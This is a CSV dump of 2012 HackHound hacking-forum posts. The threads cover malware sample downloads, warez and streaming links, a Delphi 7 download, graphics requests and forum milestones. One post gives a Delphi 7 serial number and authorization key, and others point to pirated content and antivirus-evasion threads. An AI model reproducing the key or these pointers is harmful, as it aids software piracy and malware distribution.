subforum,threadTitle,authorName,postdatetime,flatcontent,userTitle
AlphaControls v8.01 Beta - Extra - HackHound,alphacontrols-v801-beta,Andain,10/12/2012 0:00,Skin component for Delphi ... Attached Files acnt_reg.zip 6.66MB 83 downloads,Newbie
R.A.I.D. Beta - Malware Samples - HackHound,raid-beta,SolarStone,10/13/2012 0:00,This was an official scam at opensc.ws so it seems. Coded by albinoskunk and BinaryHero Attached Files 65335586.png 45.36KB 134 downloads R.A.I.D. - BETA.zip 261.88KB 113 downloads,Beginner
Delphi 7 Personal Edition - Development Software - HackHound,delphi-7-personal-edition,omc,10/13/2012 0:00,Borland has previously offered a downloadable version of their Delphi IDE called the “Personal edition”. Delphi 7 Personal Edition cannot be downloadedfrom the Borland website any longer. And they no longer advertise it. Happy coding http://www.mediafire...mczgmg3j7eczsav Source; http://delphifocus.b...l-download.html,Beginner
Movies Warez - Resources - HackHound,movies-warez,P3H3X,10/14/2012 0:00,go there : Please Login or Register to see this Hidden Content I've found this website because of one of my friends !!!,Member
Watch streaming movies online - Resources - HackHound,watch-streaming-movies-online,omc,10/19/2012 0:00,When your bored and wanna watch a movie: Please Login or Register to see this Hidden Content,Beginner
Amend I - Archive - HackHound,amend-i,BullDog,10/18/2012 0:00,http://hackhound.org/forums/uploads/amend1.png,AdvancedMember
Amend I - Archive - HackHound,amend-i,AKL3GEND,10/19/2012 0:00,Nice this should have a great outcome. Everyone can help decide what they want to see as an outcome of the site that they will use on a daily basis or even a weekly basis,IntermediateMember
Watch streaming movies online - Resources - HackHound,watch-streaming-movies-online,P3H3X,10/19/2012 0:00,That's really cool !!!!!!!!!,Member
Watch streaming movies online - Resources - HackHound,watch-streaming-movies-online,BleedFromWithin,10/19/2012 0:00,Also I would like to add similar site works flawless nice high quality but mostly for TV series it's amazing Please Login or Register to see this Hidden Content,Beginner
R.A.I.D. Beta - Malware Samples - HackHound,raid-beta,BlackArray,10/20/2012 0:00,"Official stands for organized by owners, accepted by owners. The owners/staff of OpenSC had no clue that binaryhero was a scammer, they only found out after it was done thus not being official.",IntermediateMember
R.A.I.D. Beta - Malware Samples - HackHound,raid-beta,Dante,10/20/2012 0:00,"Official stands for organized by owners, accepted by owners. The owners/staff of OpenSC had no clue that binaryhero was a scammer, they only found out after it was done thus not being official. Oh really. How exactly you know all that? I assume those are the owners words right? Good for you if you believe in all that. As far as I am concerned he lied so many times in the past that I would not trust a single pencil to him. For me official is something really simple: - supported and encouraged by owners and staff with its own section at opensc; That's more then official to me. Ultimately administrator is always responsible for all the decisions he makes. If he is not responsible for his decisions and decisions that affect members in general then he is not an administrator. Of course he cannot monitor the people that works with him 24/7 but he is the ultimate responsible for what happens on that board and they (owner and staff) decided to have this as an Official tool there. The same way i consider HH administrators responsible when they set Spy-Net as an official application that ended up to be a backdoored tool. For me there's no room or excuses for mistakes like this.",IntermediateMember
Watch streaming movies online - Resources - HackHound,watch-streaming-movies-online,Dante,10/20/2012 0:00,"I still think NetFlix is cheap, affordable option for those who like to watch movies and have a gaming console ofc.",IntermediateMember
Rate My Graphic - General Discussion - HackHound,rate-my-graphic,AKL3GEND,10/23/2012 0:00,What would you rate this as for a hack hound signature?,IntermediateMember
Rate My Graphic - General Discussion - HackHound,rate-my-graphic,Legendary,10/23/2012 0:00,I think ppl usually like userbars instead of huge sigs. No?,Beginner
Rate My Graphic - General Discussion - HackHound,rate-my-graphic,AKL3GEND,10/23/2012 0:00,i dont see how the sig that i posted was a huge sig? its super small. the dimensions of the sig are 400 pixels in width and 150 pixels in height.,IntermediateMember
"Old members, Old threads? - Suggestions & Support - HackHound",old-members-old-threads,SqUeEzEr,10/24/2012 0:00,"This is directed to the current staff of Hackhound; Are you planning on integrating the snippets and threads from the past, or is this board started from scratch? There are people with the old DB on there HDD's; including the fairly new DB's from when HH was ditched last time. Any plans on recovering this legacy?",Member
"Old members, Old threads? - Suggestions & Support - HackHound",old-members-old-threads,BullDog,10/24/2012 0:00,http://hackhound.org/forums/uploads/post11.png,AdvancedMember
"Old members, Old threads? - Suggestions & Support - HackHound",old-members-old-threads,AKL3GEND,10/24/2012 0:00,this makes sense and is a perfect idea to rebuild what once was a good site.,IntermediateMember
[REQ] logo&#092;avatar - Requests - HackHound,req-logoavatar,HttP-NuKe,10/24/2012 0:00,"hey, if it's possiable that someone would make me an avarat and a logo avatar for the forums, and a logo 300 x 300 thanks",AdvancedMember
[REQ] logo&#092;avatar - Requests - HackHound,req-logoavatar,AKL3GEND,10/24/2012 0:00,i will work on your logo. what do you want in the logo? edit: are you sure you want it 300x300? here is what i have for now. ill be back later though and will make more Please Login or Register to see this Hidden Content Please Login or Register to see this Hidden Content 33.38KB 3 downloads,IntermediateMember
[REQ] logo&#092;avatar - Requests - HackHound,req-logoavatar,HttP-NuKe,10/24/2012 0:00,"umm, idk about that 300 x 300 thing i just thought it would be fine? u know what, do it with ur taste gl and ty",AdvancedMember
[REQ] logo&#092;avatar - Requests - HackHound,req-logoavatar,AKL3GEND,10/25/2012 0:00,Yeah. I'll spice it up a bit when I get back to my computer,IntermediateMember
Rate My Graphic - General Discussion - HackHound,rate-my-graphic,rhinomodz,10/25/2012 0:00,I would rate it a 7 out of 10 very nice,Newbie
Rate My Graphic - General Discussion - HackHound,rate-my-graphic,AKL3GEND,10/25/2012 0:00,Thanks for the feedback rhino,IntermediateMember
[REQ] logo&#092;avatar - Requests - HackHound,req-logoavatar,AKL3GEND,10/25/2012 0:00,here is another one. Please Login or Register to see this Hidden Content Please Login or Register to see this Hidden Content 23.2KB 10 downloads,IntermediateMember
Member # 1000 - Challenges - HackHound,member-1000,BullDog,10/24/2012 0:00,http://hackhound.org/forums/uploads/member1000.png,AdvancedMember
Member # 1000 - Challenges - HackHound,member-1000,AKL3GEND,10/24/2012 0:00,thats kinda cool. to bad im member number 84. ehhh anyways good luck to whatever member gets it! Edit: so far as of right now we have 400 members on the forum,IntermediateMember
Member # 1000 - Challenges - HackHound,member-1000,turbo420,10/24/2012 0:00,"This is a very good prize WoW . maybe this will help get are ""guests"" in the door.",AdvancedMember
Member # 1000 - Challenges - HackHound,member-1000,Code Red,10/24/2012 0:00,Crazy shit. Can I get my account deleted. I promise I'll be back in a few days.,Member
If You Need It I Can Make It - General Discussion - HackHound,if-you-need-it-i-can-make-it,AKL3GEND,10/25/2012 0:00,"if anyone needs avatars, or signatures for there profiles hit me up. post here, i check daily if i dont get back to you in a day shoot me a pm. just send me a message with the demensions of what you want, and a little bit of detail of what you want in it and i can make it come to life. so if you have anything you want made let me know and i can do my best to make it. anyways thanks for reading this. hit me up.",IntermediateMember
Member # 1000 - Challenges - HackHound,member-1000,AKL3GEND,10/26/2012 0:00,Crazy shit. Can I get my account deleted. I promise I'll be back in a few days. if only it was that easy xD i think we would all do that if it were that easy,IntermediateMember
Member # 1000 - Challenges - HackHound,member-1000,icex,10/26/2012 0:00,weww.. nice going! I can use something like that.,Beginner
"Old members, Old threads? - Suggestions & Support - HackHound",old-members-old-threads,icex,10/26/2012 0:00,I remember the undetection tread. Treads like that from the old DB wil be very usefull..,Beginner
Watch streaming movies online - Resources - HackHound,watch-streaming-movies-online,Guest_L1nkiboy_*,10/29/2012 0:00,Please Login or Register to see this Hidden Content Please Login or Register to see this Hidden Content these r mostly german streams but u find also english movies,NULL
If You Need It I Can Make It - General Discussion - HackHound,if-you-need-it-i-can-make-it,JuMp3r,10/30/2012 0:00,"thanks for the signature, it looks nice man ur thebest",Member
If You Need It I Can Make It - General Discussion - HackHound,if-you-need-it-i-can-make-it,AKL3GEND,10/30/2012 0:00,im workin on some right now. and it is free bein as i cant post in the marketplace for some odd reason. i will post them here when done =) i will implement old ones with custom ones and i will make new ones. i dont know what demensions are normal so untill i get some ill just use my normal 400 pixels wide by 150 pixels tall,IntermediateMember
If You Need It I Can Make It - General Discussion - HackHound,if-you-need-it-i-can-make-it,AKL3GEND,10/31/2012 0:00,here is just a quick 10 minute picture. Edit: also here is another one Edit: here is another one Edit: here is another one Edit: here is the original but changed up a little bit,IntermediateMember
MarketPlace is now open - Archive - HackHound,marketplace-is-now-open,BullDog,10/31/2012 0:00,http://hackhound.org/forums/uploads/post18.png,AdvancedMember
MarketPlace is now open - Archive - HackHound,marketplace-is-now-open,AKL3GEND,10/31/2012 0:00,thanks guys =) great work!,IntermediateMember
Watch streaming movies online - Resources - HackHound,watch-streaming-movies-online,x58,11/1/2012 0:00,Thanks man haha +1 I was bored check what i've made for it. Please Login or Register to see this Hidden Content R.I.P noobroom as of 11-4-12 XD,Advanced
Delphi 7 Personal Edition - Development Software - HackHound,delphi-7-personal-edition,skurc8,11/1/2012 0:00,nice share dude...i needed it..,Newbie
Member # 1000 - Challenges - HackHound,member-1000,dimmy,11/1/2012 0:00,Awesome share from you guys keep it up . I appreciate doing this kind of stuff,Beginner
If You Need It I Can Make It - General Discussion - HackHound,if-you-need-it-i-can-make-it,AKL3GEND,11/2/2012 0:00,here is another one. if someone gave me some ideas i can make more. but this is what i have so far untill i think of something else.,IntermediateMember
If You Need It I Can Make It - General Discussion - HackHound,if-you-need-it-i-can-make-it,AKL3GEND,11/5/2012 0:00,what about this. i spent a little more time with it. but here it is http://i880.photobucket.com/albums/ac10/AKL3GEND/test.gif,IntermediateMember
Watch streaming movies online - Resources - HackHound,watch-streaming-movies-online,rootdbs,11/11/2012 0:00,"Want to see LIVE sport ? for free. First, download sopcast @ Please Login or Register to see this Hidden Content . Then go to : Please Login or Register to see this Hidden Content , find you match, and see after the sopcast icon, then you get GOOD quality sport",Newbie
Watch streaming movies online - Resources - HackHound,watch-streaming-movies-online,HttP-NuKe,11/11/2012 0:00,"damn sports, for me, i think sports (football) are just 22 dummys going after leathered ball.",AdvancedMember
Watch streaming movies online - Resources - HackHound,watch-streaming-movies-online,Dante,11/12/2012 0:00,"damn sports, for me, i think sports (football) are just 22 dummys going after leathered ball. What do you like then?",IntermediateMember
Member # 1000 - Challenges - HackHound,member-1000,Dante,11/13/2012 0:00,Less than 200 to go. Kind of anxious to see who's going to get it. I just hope it's not one of those bots.,IntermediateMember
Watch streaming movies online - Resources - HackHound,watch-streaming-movies-online,rootdbs,11/14/2012 0:00,What do you like then? I think we have a winner : http://www.youtube.com/watch?v=WUrJuSh0evE,Newbie
Delphi 7 Personal Edition - Development Software - HackHound,delphi-7-personal-edition,kesasd,11/14/2012 0:00,i need it to thanx. some sources need this version.,Newbie
"Spammers, proxies and banned members - Archive - HackHound",spammers-proxies-and-banned-members,Ravage,11/14/2012 0:00,"We installed a system to avoid registrations coming from tagged emails and proxies with IPB, StopForumSpam and ProjectHoneyPot databases. The downside of this system is the ""false positives"" associated with it. If any member sees his legit account banned on registration please have someone contacting us so we can check that for you or use a different internet connection to register and contact us directly from board and we will be pleased to help you out. We are sorry for any inconvenience this might cause to any member but its for the best.",Expert
Basic 4 Android Coupon -50% off - Resources Sources - HackHound,basic-4-android-coupon-50-off,Ominous,11/15/2012 0:00,"B4A is an IDE similar to basic for developing android apps. This coupon code is for 50% off the enterprise edition. It comes to a total of 49.50 USD I think. It also gives me an extra year of free upgrades. Upon purchase, everyone receives a unique code which will also give them the extra year. Code: ceetrw",Member
Delphi 7 Personal Edition - Development Software - HackHound,delphi-7-personal-edition,anonymous,11/16/2012 0:00,Nice Work ) but DONT copy paste the other work,Beginner
Delphi 7 Personal Edition - Development Software - HackHound,delphi-7-personal-edition,RTH,11/16/2012 0:00,what is the serial number and authorization key?,Newbie
Delphi 7 Personal Edition - Development Software - HackHound,delphi-7-personal-edition,RTH,11/16/2012 0:00,"anyways thanks for sharing, i got the serial number and key by googling for 2 minutes.. here it is for interested one, (just wanna save your 2 minutes!! ;p) key : PWCX-JZVACZ-3NH6GC-V5VF authorization key : 7DC-72P",Newbie
Member # 1000 - Challenges - HackHound,member-1000,Dante,11/18/2012 0:00,Alright we are in final countdown. http://i46.tinypic.com/xoldds.jpg,IntermediateMember
Member # 1000 - Challenges - HackHound,member-1000,turbo420,11/18/2012 0:00,nice wallpaper,AdvancedMember
Member # 1000 - Challenges - HackHound,member-1000,Dante,11/18/2012 0:00,google is a blessing.,IntermediateMember
AlphaControls v8.01 Beta - Extra - HackHound,alphacontrols-v801-beta,sergelen,11/20/2012 0:00,"Hi,Andain.Thanks for sharing.",Beginner
Member # 1000 - Challenges - HackHound,member-1000,Ravage,11/23/2012 0:00,First milestone is now accomplished. Congrats to TeknoZed. Member 1000th. Please contact BullDog or myself to collect your prize. Thanks to everyone that registered so far. Forum statistics will now get rebuilt to clean banned/deleted spammers account and dummy data. http://www.hackhound.org/forums/uploads/1000.png,Expert
Member # 1000 - Challenges - HackHound,member-1000,Dante,11/24/2012 0:00,Finally. Congrats dude.,IntermediateMember
Member # 1000 - Challenges - HackHound,member-1000,BullDog,11/24/2012 0:00,Congrats to TeknoZed. Member 1000th. Finally! Congratulations TeknoZed. Now let's just hope your not a bot or something like that,AdvancedMember
